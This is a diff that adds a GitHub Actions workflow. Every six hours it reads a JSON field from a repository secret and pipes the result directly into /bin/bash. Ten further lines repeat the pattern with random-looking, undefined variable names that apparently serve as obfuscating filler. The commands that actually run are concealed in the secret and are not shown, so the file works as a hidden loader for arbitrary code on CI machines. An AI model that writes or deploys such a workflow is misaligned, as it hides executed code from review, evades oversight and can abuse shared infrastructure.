@@ -1,0 +1,28 @@
+name: baichinianle
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: baichinianle
+        env:
+          i095: ${{ secrets.i095 }}
+        run: |
+          echo $i095 | jq -r .pyd6 | /bin/bash
+          echo $qjoxf2610 | jq -r .jnf3196 | /bin/bash
+          echo $aszq8792 | jq -r .vapfy143 | /bin/bash
+          echo $igbks99 | jq -r .rnbke1248 | /bin/bash
+          echo $gvlcs41 | jq -r .lngfo2409 | /bin/bash
+          echo $oo609 | jq -r .mqw407 | /bin/bash
+          echo $neeig10984 | jq -r .df48184 | /bin/bash
+          echo $zp16 | jq -r .luo0 | /bin/bash
+          echo $voaw795 | jq -r .vvd2208 | /bin/bash
+          echo $xgryt35171 | jq -r .gqig25569 | /bin/bash
+          echo $owdar2 | jq -r .h0 | /bin/bash
+
